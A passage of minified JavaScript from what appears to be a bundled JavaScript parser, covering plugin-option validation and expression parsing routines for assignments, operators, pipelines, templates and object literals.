super.maybeParseExportDefaultSpecifier(Q,Y)}checkExport(Q){let{specifiers:Y}=Q;if(Y!=null&&Y.length)Q.specifiers=Y.filter((W)=>W.exported.type==="Placeholder");super.checkExport(Q),Q.specifiers=Y}parseImport(Q){let Y=this.parsePlaceholder("Identifier");if(!Y)return super.parseImport(Q);if(Q.specifiers=[],!this.isContextual(98)&&!this.match(12))return Q.source=this.finishPlaceholder(Y,"StringLiteral"),this.semicolon(),this.finishNode(Q,"ImportDeclaration");let W=this.startNodeAtNode(Y);if(W.local=Y,Q.specifiers.push(this.finishNode(W,"ImportDefaultSpecifier")),this.eat(12)){if(!this.maybeParseStarImportSpecifier(Q))this.parseNamedImportSpecifiers(Q)}return this.expectContextual(98),Q.source=this.parseImportSource(),this.semicolon(),this.finishNode(Q,"ImportDeclaration")}parseImportSource(){return this.parsePlaceholder("StringLiteral")||super.parseImportSource()}assertNoSpace(){if(this.state.start>this.offsetToSourcePos(this.state.lastTokEndLoc.index))this.raise(yK.UnexpectedSpace,this.state.lastTokEndLoc)}},b_=(X)=>class J extends X{parseV8Intrinsic(){if(this.match(54)){let Q=this.state.startLoc,Y=this.startNode();if(this.next(),C0(this.state.type)){let W=this.parseIdentifierName(),z=this.createIdentifier(Y,W);if(this.castNodeTo(z,"V8IntrinsicIdentifier"),this.match(10))return z}this.unexpected(Q)}}parseExprAtom(Q){return this.parseV8Intrinsic()||super.parseExprAtom(Q)}},mK=["minimal","fsharp","hack","smart"],uK=["^^","@@","^","%","#"];function v_(X){if(X.has("decorators")){if(X.has("decorators-legacy"))throw new Error("Cannot use the decorators and decorators-legacy plugin together");let Y=X.get("decorators").decoratorsBeforeExport;if(Y!=null&&typeof Y!=="boolean")throw new Error("'decoratorsBeforeExport' must be a boolean, if specified.");let W=X.get("decorators").allowCallParenthesized;if(W!=null&&typeof W!=="boolean")throw new Error("'allowCallParenthesized' must be a boolean.")}if(X.has("flow")&&X.has("typescript"))throw new Error("Cannot combine flow and typescript plugins.");if(X.has("placeholders")&&X.has("v8intrinsic"))throw new Error("Cannot combine placeholders and v8intrinsic plugins.");if(X.has("pipelineOperator")){var J;let Y=X.get("pipelineOperator").proposal;if(!mK.includes(Y)){let W=mK.map((z)=>`"${z}"`).join(", ");throw new Error(`"pipelineOperator" requires "proposal" option whose value must be one of: ${W}.`)}if(Y==="hack"){if(X.has("placeholders"))throw new Error("Cannot combine placeholders plugin and Hack-style pipes.");if(X.has("v8intrinsic"))throw new Error("Cannot combine v8intrinsic plugin and Hack-style pipes.");let W=X.get("pipelineOperator").topicToken;if(!uK.includes(W)){let z=uK.map((G)=>`"${G}"`).join(", ");throw new Error(`"pipelineOperator" in "proposal": "hack" mode also requires a "topicToken" option whose value must be one of: ${z}.`)}{var Q;if(W==="#"&&((Q=X.get("recordAndTuple"))==null?void 0:Q.syntaxType)==="hash")throw new Error(`Plugin conflict between \`["pipelineOperator", { proposal: "hack", topicToken: "#" }]\` and \`${JSON.stringify(["recordAndTuple",X.get("recordAndTuple")])}\`.`)}}else if(Y==="smart"&&((J=X.get("recordAndTuple"))==null?void 0:J.syntaxType)==="hash")throw new Error(`Plugin conflict between \`["pipelineOperator", { proposal: "smart" }]\` and \`${JSON.stringify(["recordAndTuple",X.get("recordAndTuple")])}\`.`)}if(X.has("moduleAttributes")){if(X.has("deprecatedImportAssert")||X.has("importAssertions"))throw new Error("Cannot combine importAssertions, deprecatedImportAssert and moduleAttributes plugins.");if(X.get("moduleAttributes").version!=="may-2020")throw new Error("The 'moduleAttributes' plugin requires a 'version' option, representing the last proposal update. Currently, the only supported value is 'may-2020'.")}if(X.has("importAssertions")){if(X.has("deprecatedImportAssert"))throw new Error("Cannot combine importAssertions and deprecatedImportAssert plugins.")}if(!X.has("deprecatedImportAssert")&&X.has("importAttributes")&&X.get("importAttributes").deprecatedAssertSyntax)X.set("deprecatedImportAssert",{});if(X.has("recordAndTuple")){let Y=X.get("recordAndTuple").syntaxType;if(Y!=null){let W=["hash","bar"];if(!W.includes(Y))throw new Error("The 'syntaxType' option of the 'recordAndTuple' plugin must be one of: "+W.map((z)=>`'${z}'`).join(", "))}}if(X.has("asyncDoExpressions")&&!X.has("doExpressions")){let Y=new Error("'asyncDoExpressions' requires 'doExpressions', please add 'doExpressions' to parser plugins.");throw Y.missingPlugins="doExpressions",Y}if(X.has("optionalChainingAssign")&&X.get("optionalChainingAssign").version!=="2023-07")throw new Error("The 'optionalChainingAssign' plugin requires a 'version' option, representing the last proposal update. Currently, the only supported value is '2023-07'.");if(X.has("discardBinding")&&X.get("discardBinding").syntaxType!=="void")throw new Error("The 'discardBinding' plugin requires a 'syntaxType' option. Currently the only supported value is 'void'.")}var OV={estree:hT,jsx:j_,flow:q_,typescript:T_,v8intrinsic:b_,placeholders:k_},x_=Object.keys(OV);class RV extends MV{checkProto(X,J,Q,Y){if(X.type==="SpreadElement"||this.isObjectMethod(X)||X.computed||X.shorthand)return Q;let W=X.key;if((W.type==="Identifier"?W.name:W.value)==="__proto__"){if(J)return this.raise(b.RecordNoProto,W),!0;if(Q)if(Y){if(Y.doubleProtoLoc===null)Y.doubleProtoLoc=W.loc.start}else this.raise(b.DuplicateProto,W);return!0}return Q}shouldExitDescending(X,J){return X.type==="ArrowFunctionExpression"&&this.offsetToSourcePos(X.start)===J}getExpression(){if(this.enterInitialScopes(),this.nextToken(),this.match(140))throw this.raise(b.ParseExpressionEmptyInput,this.state.startLoc);let X=this.parseExpression();if(!this.match(140))throw this.raise(b.ParseExpressionExpectsEOF,this.state.startLoc,{unexpected:this.input.codePointAt(this.state.start)});if(this.finalizeRemainingComments(),X.comments=this.comments,X.errors=this.state.errors,this.optionFlags&256)X.tokens=this.tokens;return X}parseExpression(X,J){if(X)return this.disallowInAnd(()=>this.parseExpressionBase(J));return this.allowInAnd(()=>this.parseExpressionBase(J))}parseExpressionBase(X){let J=this.state.startLoc,Q=this.parseMaybeAssign(X);if(this.match(12)){let Y=this.startNodeAt(J);Y.expressions=[Q];while(this.eat(12))Y.expressions.push(this.parseMaybeAssign(X));return this.toReferencedList(Y.expressions),this.finishNode(Y,"SequenceExpression")}return Q}parseMaybeAssignDisallowIn(X,J){return this.disallowInAnd(()=>this.parseMaybeAssign(X,J))}parseMaybeAssignAllowIn(X,J){return this.allowInAnd(()=>this.parseMaybeAssign(X,J))}setOptionalParametersError(X){X.optionalParametersLoc=this.state.startLoc}parseMaybeAssign(X,J){let Q=this.state.startLoc,Y=this.isContextual(108);if(Y){if(this.prodParam.hasYield){this.next();let H=this.parseYield(Q);if(J)H=J.call(this,H,Q);return H}}let W;if(X)W=!1;else X=new O5,W=!0;let{type:z}=this.state;if(z===10||C0(z))this.state.potentialArrowAt=this.state.start;let G=this.parseMaybeConditional(X);if(J)G=J.call(this,G,Q);if(lT(this.state.type)){let H=this.startNodeAt(Q),U=this.state.value;if(H.operator=U,this.match(29)){this.toAssignable(G,!0),H.left=G;let K=Q.index;if(X.doubleProtoLoc!=null&&X.doubleProtoLoc.index>=K)X.doubleProtoLoc=null;if(X.shorthandAssignLoc!=null&&X.shorthandAssignLoc.index>=K)X.shorthandAssignLoc=null;if(X.privateKeyLoc!=null&&X.privateKeyLoc.index>=K)this.checkDestructuringPrivate(X),X.privateKeyLoc=null;if(X.voidPatternLoc!=null&&X.voidPatternLoc.index>=K)X.voidPatternLoc=null}else H.left=G;return this.next(),H.right=this.parseMaybeAssign(),this.checkLVal(G,this.finishNode(H,"AssignmentExpression")),H}else if(W)this.checkExpressionErrors(X,!0);if(Y){let{type:H}=this.state;if((this.hasPlugin("v8intrinsic")?M5(H):M5(H)&&!this.match(54))&&!this.isAmbiguousPrefixOrIdentifier())return this.raiseOverwrite(b.YieldNotInGeneratorFunction,Q),this.parseYield(Q)}return G}parseMaybeConditional(X){let J=this.state.startLoc,Q=this.state.potentialArrowAt,Y=this.parseExprOps(X);if(this.shouldExitDescending(Y,Q))return Y;return this.parseConditional(Y,J,X)}parseConditional(X,J,Q){if(this.eat(17)){let Y=this.startNodeAt(J);return Y.test=X,Y.consequent=this.parseMaybeAssignAllowIn(),this.expect(14),Y.alternate=this.parseMaybeAssign(),this.finishNode(Y,"ConditionalExpression")}return X}parseMaybeUnaryOrPrivate(X){return this.match(139)?this.parsePrivateName():this.parseMaybeUnary(X)}parseExprOps(X){let J=this.state.startLoc,Q=this.state.potentialArrowAt,Y=this.parseMaybeUnaryOrPrivate(X);if(this.shouldExitDescending(Y,Q))return Y;return this.parseExprOp(Y,J,-1)}parseExprOp(X,J,Q){if(this.isPrivateName(X)){let W=this.getPrivateNameSV(X);if(Q>=Y4(58)||!this.prodParam.hasIn||!this.match(58))this.raise(b.PrivateInExpectedIn,X,{identifierName:W});this.classScope.usePrivateName(W,X.loc.start)}let Y=this.state.type;if(dT(Y)&&(this.prodParam.hasIn||!this.match(58))){let W=Y4(Y);if(W>Q){if(Y===39){if(this.expectPlugin("pipelineOperator"),this.state.inFSharpPipelineDirectBody)return X;this.checkPipelineAtInfixOperator(X,J)}let z=this.startNodeAt(J);z.left=X,z.operator=this.state.value;let G=Y===41||Y===42,H=Y===40;if(H)W=Y4(42);if(this.next(),Y===39&&this.hasPlugin(["pipelineOperator",{proposal:"minimal"}])){if(this.state.type===96&&this.prodParam.hasAwait)throw this.raise(b.UnexpectedAwaitAfterPipelineBody,this.state.startLoc)}z.right=this.parseExprOpRightExpr(Y,W);let U=this.finishNode(z,G||H?"LogicalExpression":"BinaryExpression"),K=this.state.type;if(H&&(K===41||K===42)||G&&K===40)throw this.raise(b.MixingCoalesceWithLogical,this.state.startLoc);return this.parseExprOp(U,J,Q)}}return X}parseExprOpRightExpr(X,J){let Q=this.state.startLoc;switch(X){case 39:switch(this.getPluginOption("pipelineOperator","proposal")){case"hack":return this.withTopicBindingContext(()=>{return this.parseHackPipeBody()});case"fsharp":return this.withSoloAwaitPermittingContext(()=>{return this.parseFSharpPipelineBody(J)})}if(this.getPluginOption("pipelineOperator","proposal")==="smart")return this.withTopicBindingContext(()=>{if(this.prodParam.hasYield&&this.isContextual(108))throw this.raise(b.PipeBodyIsTighter,this.state.startLoc);return this.parseSmartPipelineBodyInStyle(this.parseExprOpBaseRightExpr(X,J),Q)});default:return this.parseExprOpBaseRightExpr(X,J)}}parseExprOpBaseRightExpr(X,J){let Q=this.state.startLoc;return this.parseExprOp(this.parseMaybeUnaryOrPrivate(),Q,sT(X)?J-1:J)}parseHackPipeBody(){var X;let{startLoc:J}=this.state,Q=this.parseMaybeAssign();if($T.has(Q.type)&&!((X=Q.extra)!=null&&X.parenthesized))this.raise(b.PipeUnparenthesizedBody,J,{type:Q.type});if(!this.topicReferenceWasUsedInCurrentContext())this.raise(b.PipeTopicUnused,J);return Q}checkExponentialAfterUnary(X){if(this.match(57))this.raise(b.UnexpectedTokenUnaryExponentiation,X.argument)}parseMaybeUnary(X,J){let Q=this.state.startLoc,Y=this.isContextual(96);if(Y&&this.recordAwaitIfAllowed()){this.next();let H=this.parseAwait(Q);if(!J)this.checkExponentialAfterUnary(H);return H}let W=this.match(34),z=this.startNode();if(rT(this.state.type)){if(z.operator=this.state.value,z.prefix=!0,this.match(72))this.expectPlugin("throwExpressions");let H=this.match(89);if(this.next(),z.argument=this.parseMaybeUnary(null,!0),this.checkExpressionErrors(X,!0),this.state.strict&&H){let U=z.argument;if(U.type==="Identifier")this.raise(b.StrictDelete,z);else if(this.hasPropertyAsPrivateName(U))this.raise(b.DeletePrivateField,z)}if(!W){if(!J)this.checkExponentialAfterUnary(z);return this.finishNode(z,"UnaryExpression")}}let G=this.parseUpdate(z,W,X);if(Y){let{type:H}=this.state;if((this.hasPlugin("v8intrinsic")?M5(H):M5(H)&&!this.match(54))&&!this.isAmbiguousPrefixOrIdentifier())return this.raiseOverwrite(b.AwaitNotInAsyncContext,Q),this.parseAwait(Q)}return G}parseUpdate(X,J,Q){if(J){let z=X;return this.checkLVal(z.argument,this.finishNode(z,"UpdateExpression")),X}let Y=this.state.startLoc,W=this.parseExprSubscripts(Q);if(this.checkExpressionErrors(Q,!1))return W;while(iT(this.state.type)&&!this.canInsertSemicolon()){let z=this.startNodeAt(Y);z.operator=this.state.value,z.prefix=!1,z.argument=W,this.next(),this.checkLVal(W,W=this.finishNode(z,"UpdateExpression"))}return W}parseExprSubscripts(X){let J=this.state.startLoc,Q=this.state.potentialArrowAt,Y=this.parseExprAtom(X);if(this.shouldExitDescending(Y,Q))return Y;return this.parseSubscripts(Y,J)}parseSubscripts(X,J,Q){let Y={optionalChainMember:!1,maybeAsyncArrow:this.atPossibleAsyncArrow(X),stop:!1};do X=this.parseSubscript(X,J,Q,Y),Y.maybeAsyncArrow=!1;while(!Y.stop);return X}parseSubscript(X,J,Q,Y){let{type:W}=this.state;if(!Q&&W===15)return this.parseBind(X,J,Q,Y);else if(G4(W))return this.parseTaggedTemplateExpression(X,J,Y);let z=!1;if(W===18){if(Q){if(this.raise(b.OptionalChainingNoNew,this.state.startLoc),this.lookaheadCharCode()===40)return this.stopParseSubscript(X,Y)}Y.optionalChainMember=z=!0,this.next()}if(!Q&&this.match(10))return this.parseCoverCallAndAsyncArrowHead(X,J,Y,z);else{let G=this.eat(0);if(G||z||this.eat(16))return this.parseMember(X,J,Y,G,z);else return this.stopParseSubscript(X,Y)}}stopParseSubscript(X,J){return J.stop=!0,X}parseMember(X,J,Q,Y,W){let z=this.startNodeAt(J);if(z.object=X,z.computed=Y,Y)z.property=this.parseExpression(),this.expect(3);else if(this.match(139)){if(X.type==="Super")this.raise(b.SuperPrivateField,J);this.classScope.usePrivateName(this.state.value,this.state.startLoc),z.property=this.parsePrivateName()}else z.property=this.parseIdentifier(!0);if(Q.optionalChainMember)return z.optional=W,this.finishNode(z,"OptionalMemberExpression");else return this.finishNode(z,"MemberExpression")}parseBind(X,J,Q,Y){let W=this.startNodeAt(J);return W.object=X,this.next(),W.callee=this.parseNoCallExpr(),Y.stop=!0,this.parseSubscripts(this.finishNode(W,"BindExpression"),J,Q)}parseCoverCallAndAsyncArrowHead(X,J,Q,Y){let W=this.state.maybeInArrowParameters,z=null;this.state.maybeInArrowParameters=!0,this.next();let G=this.startNodeAt(J);G.callee=X;let{maybeAsyncArrow:H,optionalChainMember:U}=Q;if(H)this.expressionScope.enter(I_()),z=new O5;if(U)G.optional=Y;if(Y)G.arguments=this.parseCallExpressionArguments();else G.arguments=this.parseCallExpressionArguments(X.type!=="Super",G,z);let K=this.finishCallExpression(G,U);if(H&&this.shouldParseAsyncArrow()&&!Y)Q.stop=!0,this.checkDestructuringPrivate(z),this.expressionScope.validateAsPattern(),this.expressionScope.exit(),K=this.parseAsyncArrowFromCallExpression(this.startNodeAt(J),K);else{if(H)this.checkExpressionErrors(z,!0),this.expressionScope.exit();this.toReferencedArguments(K)}return this.state.maybeInArrowParameters=W,K}toReferencedArguments(X,J){this.toReferencedListDeep(X.arguments,J)}parseTaggedTemplateExpression(X,J,Q){let Y=this.startNodeAt(J);if(Y.tag=X,Y.quasi=this.parseTemplate(!0),Q.optionalChainMember)this.raise(b.OptionalChainingNoTemplate,J);return this.finishNode(Y,"TaggedTemplateExpression")}atPossibleAsyncArrow(X){return X.type==="Identifier"&&X.name==="async"&&this.state.lastTokEndLoc.index===X.end&&!this.canInsertSemicolon()&&X.end-X.start===5&&this.offsetToSourcePos(X.start)===this.state.potentialArrowAt}finishCallExpression(X,J){if(X.callee.type==="Import"){if(X.arguments.length===0||X.arguments.length>2)this.raise(b.ImportCallArity,X);else for(let Q of X.arguments)if(Q.type==="SpreadElement")this.raise(b.ImportCallSpreadArgument,Q)}return this.finishNode(X,J?"OptionalCallExpression":"CallExpression")}parseCallExpressionArguments(X,J,Q){let Y=[],W=!0,z=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;while(!this.eat(11)){if(W)W=!1;else if(this.expect(12),this.match(11)){if(J)this.addTrailingCommaExtraToNode(J);this.next();break}Y.push(this.parseExprListItem(11,!1,Q,X))}return this.state.inFSharpPipelineDirectBody=z,Y}shouldParseAsyncArrow(){return this.match(19)&&!this.canInsertSemicolon()}parseAsyncArrowFromCallExpression(X,J){var Q;if(this.resetPreviousNodeTrailingComments(J),this.expect(19),this.parseArrowExpression(X,J.arguments,!0,(Q=J.extra)==null?void 0:Q.trailingCommaLoc),J.innerComments)A5(X,J.innerComments);if(J.callee.trailingComments)A5(X,J.callee.trailingComments);return X}parseNoCallExpr(){let X=this.state.startLoc;return this.parseSubscripts(this.parseExprAtom(),X,!0)}parseExprAtom(X){let J,Q=null,{type:Y}=this.state;switch(Y){case 79:return this.parseSuper();case 83:if(J=this.startNode(),this.next(),this.match(16))return this.parseImportMetaPropertyOrPhaseCall(J);if(this.match(10))if(this.optionFlags&512)return this.parseImportCall(J);else return this.finishNode(J,"Import");else return this.raise(b.UnsupportedImport,this.state.lastTokStartLoc),this.finishNode(J,"Import");case 78:return J=this.startNode(),this.next(),this.finishNode(J,"ThisExpression");case 90:return this.parseDo(this.startNode(),!1);case 56:case 31:return this.readRegexp(),this.parseRegExpLiteral(this.state.value);case 135:return this.parseNumericLiteral(this.state.value);case 136:return this.parseBigIntLiteral(this.state.value);case 134:return this.parseStringLiteral(this.state.value);case 84:return this.parseNullLiteral();case 85:return this.parseBooleanLiteral(!0);case 86:return this.parseBooleanLiteral(!1);case 10:{let W=this.state.potentialArrowAt===this.state.start;return this.parseParenAndDistinguishExpression(W)}case 0:return this.parseArrayLike(3,!0,!1,X);case 5:return this.parseObjectLike(8,!1,!1,X);case 68:return this.parseFunctionOrFunctionSent();case 26:Q=this.parseDecorators();case 80:return this.parseClass(this.maybeTakeDecorators(Q,this.startNode()),!1);case 77:return this.parseNewOrNewTarget();case 25:case 24:return this.parseTemplate(!1);case 15:{J=this.startNode(),this.next(),J.object=null;let W=J.callee=this.parseNoCallExpr();if(W.type==="MemberExpression")return this.finishNode(J,"BindExpression");else throw this.raise(b.UnsupportedBind,W)}case 139:return this.raise(b.PrivateInExpectedIn,this.state.startLoc,{identifierName:this.state.value}),this.parsePrivateName();case 33:return this.parseTopicReferenceThenEqualsSign(54,"%");case 32:return this.parseTopicReferenceThenEqualsSign(44,"^");case 37:case 38:return this.parseTopicReference("hack");case 44:case 54:case 27:{let W=this.getPluginOption("pipelineOperator","proposal");if(W)return this.parseTopicReference(W);this.unexpected();break}case 47:{let W=this.input.codePointAt(this.nextTokenStart());if(N6(W)||W===62)this.expectOnePlugin(["jsx","flow","typescript"]);else this.unexpected();break}default:if(Y===137)return this.parseDecimalLiteral(this.state.value);else if(Y===2||Y===1)return this.parseArrayLike(this.state.type===2?4:3,!1,!0);else if(Y===6||Y===7)return this.parseObjectLike(this.state.type===6?9:8,!1,!0);if(C0(Y)){if(this.isContextual(127)&&this.lookaheadInLineCharCode()===123)return this.parseModuleExpression();let W=this.state.potentialArrowAt===this.state.start,z=this.state.containsEsc,G=this.parseIdentifier();if(!z&&G.name==="async"&&!this.canInsertSemicolon()){let{type:H}=this.state;if(H===68)return this.resetPreviousNodeTrailingComments(G),this.next(),this.parseAsyncFunctionExpression(this.startNodeAtNode(G));else if(C0(H))if(this.lookaheadCharCode()===61)return this.parseAsyncArrowUnaryFunction(this.startNodeAtNode(G));else return G;else if(H===90)return this.resetPreviousNodeTrailingComments(G),this.parseDo(this.startNodeAtNode(G),!0)}if(W&&this.match(19)&&!this.canInsertSemicolon())return this.next(),this.parseArrowExpression(this.startNodeAtNode(G),[G],!1);return G}else this.unexpected()}}parseTopicReferenceThenEqualsSign(X,J){let Q=this.getPluginOption("pipelineOperator","proposal");if(Q)return this.state.type=X,this.state.value=J,this.state.pos--,this.state.end--,this.state.endLoc=C9(this.state.endLoc,-1),this.parseTopicReference(Q);else this.unexpected()}parseTopicReference(X){let J=this.startNode(),Q=this.state.startLoc,Y=this.state.type;return this.next(),this.finishTopicReference(J,Q,X,Y)}finishTopicReference(X,J,Q,Y){if(this.testTopicReferenceConfiguration(Q,J,Y))if(Q==="hack"){if(!this.topicReferenceIsAllowedInCurrentContext())this.raise(b.PipeTopicUnbound,J);return this.registerTopicReference(),this.finishNode(X,"TopicReference")}else{if(!this.topicReferenceIsAllowedInCurrentContext())this.raise(b.PrimaryTopicNotAllowed,J);return this.registerTopicReference(),this.finishNode(X,"PipelinePrimaryTopicReference")}else throw this.raise(b.PipeTopicUnconfiguredToken,J,{token:r6(Y)})}testTopicReferenceConfiguration(X,J,Q){switch(X){case"hack":return this.hasPlugin(["pipelineOperator",{topicToken:r6(Q)}]);case"smart":return Q===27;default:throw this.raise(b.PipeTopicRequiresHackPipes,J)}}parseAsyncArrowUnaryFunction(X){this.prodParam.enter(W4(!0,this.prodParam.hasYield));let J=[this.parseIdentifier()];if(this.prodParam.exit(),this.hasPrecedingLineBreak())this.raise(b.LineTerminatorBeforeArrow,this.state.curPosition());return this.expect(19),this.parseArrowExpression(X,J,!0)}parseDo(X,J){if(this.expectPlugin("doExpressions"),J)this.expectPlugin("asyncDoExpressions");X.async=J,this.next();let Q=this.state.labels;if(this.state.labels=[],J)this.prodParam.enter(2),X.body=this.parseBlock(),this.prodParam.exit();else X.body=this.parseBlock();return this.state.labels=Q,this.finishNode(X,"DoExpression")}parseSuper(){let X=this.startNode();if(this.next(),this.match(10)&&!this.scope.allowDirectSuper&&!(this.optionFlags&16))this.raise(b.SuperNotAllowed,X);else if(!this.scope.allowSuper&&!(this.optionFlags&16))this.raise(b.UnexpectedSuper,X);if(!this.match(10)&&!this.match(0)&&!this.match(16))this.raise(b.UnsupportedSuper,X);return this.finishNode(X,"Super")}parsePrivateName(){let X=this.startNode(),J=this.startNodeAt(C9(this.state.startLoc,1)),Q=this.state.value;return this.next(),X.id=this.createIdentifier(J,Q),this.finishNode(X,"PrivateName")}parseFunctionOrFunctionSent(){let X=this.startNode();if(this.next(),this.prodParam.hasYield&&this.match(16)){let J=this.createIdentifier(this.startNodeAtNode(X),"function");if(this.next(),this.match(103))this.expectPlugin("functionSent");else if(!this.hasPlugin("functionSent"))this.unexpected();return this.parseMetaProperty(X,J,"sent")}return this.parseFunction(X)}parseMetaProperty(X,J,Q){X.meta=J;let Y=this.state.containsEsc;if(X.property=this.parseIdentifier(!0),X.property.name!==Q||Y)this.raise(b.UnsupportedMetaProperty,X.property,{target:J.name,onlyValidPropertyName:Q});return this.finishNode(X,"MetaProperty")}parseImportMetaPropertyOrPhaseCall(X){if(this.next(),this.isContextual(105)||this.isContextual(97)){let J=this.isContextual(105);return this.expectPlugin(J?"sourcePhaseImports":"deferredImportEvaluation"),this.next(),X.phase=J?"source":"defer",this.parseImportCall(X)}else{let J=this.createIdentifierAt(this.startNodeAtNode(X),"import",this.state.lastTokStartLoc);if(this.isContextual(101)){if(!this.inModule)this.raise(b.ImportMetaOutsideModule,J);this.sawUnambiguousESM=!0}return this.parseMetaProperty(X,J,"meta")}}parseLiteralAtNode(X,J,Q){return this.addExtra(Q,"rawValue",X),this.addExtra(Q,"raw",this.input.slice(this.offsetToSourcePos(Q.start),this.state.end)),Q.value=X,this.next(),this.finishNode(Q,J)}parseLiteral(X,J){let Q=this.startNode();return this.parseLiteralAtNode(X,J,Q)}parseStringLiteral(X){return this.parseLiteral(X,"StringLiteral")}parseNumericLiteral(X){return this.parseLiteral(X,"NumericLiteral")}parseBigIntLiteral(X){return this.parseLiteral(X,"BigIntLiteral")}parseDecimalLiteral(X){return this.parseLiteral(X,"DecimalLiteral")}parseRegExpLiteral(X){let J=this.startNode();return this.addExtra(J,"raw",this.input.slice(this.offsetToSourcePos(J.start),this.state.end)),J.pattern=X.pattern,J.flags=X.flags,this.next(),this.finishNode(J,"RegExpLiteral")}parseBooleanLiteral(X){let J=this.startNode();return J.value=X,this.next(),this.finishNode(J,"BooleanLiteral")}parseNullLiteral(){let X=this.startNode();return this.next(),this.finishNode(X,"NullLiteral")}parseParenAndDistinguishExpression(X){let J=this.state.startLoc,Q;this.next(),this.expressionScope.enter(w_());let Y=this.state.maybeInArrowParameters,W=this.state.inFSharpPipelineDirectBody;this.state.maybeInArrowParameters=!0,this.state.inFSharpPipelineDirectBody=!1;let z=this.state.startLoc,G=[],H=new O5,U=!0,K,V;while(!this.match(11)){if(U)U=!1;else if(this.expect(12,H.optionalParametersLoc===null?null:H.optionalParametersLoc),this.match(11)){V=this.state.startLoc;break}if(this.match(21)){let M=this.state.startLoc;if(K=this.state.startLoc,G.push(this.parseParenItem(this.parseRestBinding(),M)),!this.checkCommaAfterRest(41))break}else G.push(this.parseMaybeAssignAllowInOrVoidPattern(11,H,this.parseParenItem))}let B=this.state.lastTokEndLoc;this.expect(11),this.state.maybeInArrowParameters=Y,this.state.inFSharpPipelineDirectBody=W;let Z=this.startNodeAt(J);if(X&&this.shouldParseArrow(G)&&(Z=this.parseArrow(Z)))return this.checkDestructuringPrivate(H),this.expressionScope.validateAsPattern(),this.expressionScope.exit(),this.parseArrowExpression(Z,G,!1),Z;if(this.expressionScope.exit(),!G.length)this.unexpected(this.state.lastTokStartLoc);if(V)this.unexpected(V);if(K)this.unexpected(K);if(this.checkExpressionErrors(H,!0),this.toReferencedListDeep(G,!0),G.length>1)Q=this.startNodeAt(z),Q.expressions=G,this.finishNode(Q,"SequenceExpression"),this.resetEndLocation(Q,B);else Q=G[0];return this.wrapParenthesis(J,Q)}wrapParenthesis(X,J){if(!(this.optionFlags&1024))return this.addExtra(J,"parenthesized",!0),this.addExtra(J,"parenStart",X.index),this.takeSurroundingComments(J,X.index,this.state.lastTokEndLoc.index),J;let Q=this.startNodeAt(X);return Q.expression=J,this.finishNode(Q,"ParenthesizedExpression")}shouldParseArrow(X){return!this.canInsertSemicolon()}parseArrow(X){if(this.eat(19))return X}parseParenItem(X,J){return X}parseNewOrNewTarget(){let X=this.startNode();if(this.next(),this.match(16)){let J=this.createIdentifier(this.startNodeAtNode(X),"new");this.next();let Q=this.parseMetaProperty(X,J,"target");if(!this.scope.allowNewTarget)this.raise(b.UnexpectedNewTarget,Q);return Q}return this.parseNew(X)}parseNew(X){if(this.parseNewCallee(X),this.eat(10)){let J=this.parseExprList(11);this.toReferencedList(J),X.arguments=J}else X.arguments=[];return this.finishNode(X,"NewExpression")}parseNewCallee(X){let J=this.match(83),Q=this.parseNoCallExpr();if(X.callee=Q,J&&(Q.type==="Import"||Q.type==="ImportExpression"))this.raise(b.ImportCallNotNewExpression,Q)}parseTemplateElement(X){let{start:J,startLoc:Q,end:Y,value:W}=this.state,z=J+1,G=this.startNodeAt(C9(Q,1));if(W===null){if(!X)this.raise(b.InvalidEscapeSequenceTemplate,C9(this.state.firstInvalidTemplateEscapePos,1))}let H=this.match(24),U=H?-1:-2,K=Y+U;G.value={raw:this.input.slice(z,K).replace(/\r\n?/g,`
`),cooked:W===null?null:W.slice(1,U)},G.tail=H,this.next();let V=this.finishNode(G,"TemplateElement");return this.resetEndLocation(V,C9(this.state.lastTokEndLoc,U)),V}parseTemplate(X){let J=this.startNode(),Q=this.parseTemplateElement(X),Y=[Q],W=[];while(!Q.tail)W.push(this.parseTemplateSubstitution()),this.readTemplateContinuation(),Y.push(Q=this.parseTemplateElement(X));return J.expressions=W,J.quasis=Y,this.finishNode(J,"TemplateLiteral")}parseTemplateSubstitution(){return this.parseExpression()}parseObjectLike(X,J,Q,Y){if(Q)this.expectPlugin("recordAndTuple");let W=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;let z=!1,G=!0,H=this.startNode();H.properties=[],this.next();while(!this.match(X)){if(G)G=!1;else if(this.expect(12),this.match(X)){this.addTrailingCommaExtraToNode(H);break}let K;if(J)K=this.parseBindingProperty();else K=this.parsePropertyDefinition(Y),z=this.checkProto(K,Q,z,Y);if(Q&&!this.isObjectProperty(K)&&K.type!=="SpreadElement")this.raise(b.InvalidRecordProperty,K);if(K.shorthand)this.addExtra(K,"shorthand",!0);H.properties.push(K)}this.next(),this.state.inFSharpPipelineDirectBody=W;let U="ObjectExpression";if(J)U="ObjectPattern";else if(Q)U="RecordExpression";return this.finishNode(H,U)}addTrailingCommaExtraToNode(X){this.addExtra(X,"trailingComma",this.state.lastTokStartLoc.index),this.addExtra(X,"trailingCommaLoc",this.state.lastTokStartLoc,!1)}maybeAsyncOrAccessorProp(X){return!X.computed&&X.key.type==="Identifier"&&(this.isLiteralPropertyName()||this.match(0)||this.match(55))}parsePropertyDefinition(X){let J=[];if(this.match(26)){if(this.hasPlugin("decorators"))this.raise(b.UnsupportedPropertyDecorator,this.state.startLoc);while(this.match(26))J.push(this.parseDecorator())}let Q=this.startNode(),Y=!1,W=!1,z;if(this.match(21)){if(J.length)this.unexpected();return this.parseSpread()}if(J.length)Q.decorators=J,J=[];if(Q.method=!1,X)z=this.state.startLoc;let G=this.eat(55);this.parsePropertyNamePrefixOperator(Q);let H=this.state.containsEsc;if(this.parsePropertyName(Q,X),!G&&!H&&this.maybeAsyncOrAccessorProp(Q)){let{key:U}=Q,K=U.name;if(K==="async"&&!this.hasPrecedingLineBreak())Y=!0,this.resetPreviousNodeTrailingComments(U),G=this.eat(55),this.parsePropertyName(Q);if(K==="get"||K==="set"){if(W=!0,this.resetPreviousNodeTrailingComments(U),Q.kind=K,this.match(55))G=!0,this.raise(b.AccessorIsGenerator,this.state.curPosition(),{kind:K}),this.next();this.parsePropertyName(Q)}}return this.parseObjPropValue(Q,z,G,Y,!1,W,X)}getGetterSetterExpectedParamCount(X){return X.kind==="get"?0:1}getObjectOrClassMethodParams(X){return X.params}checkGetterSetterParams(X){var J;let 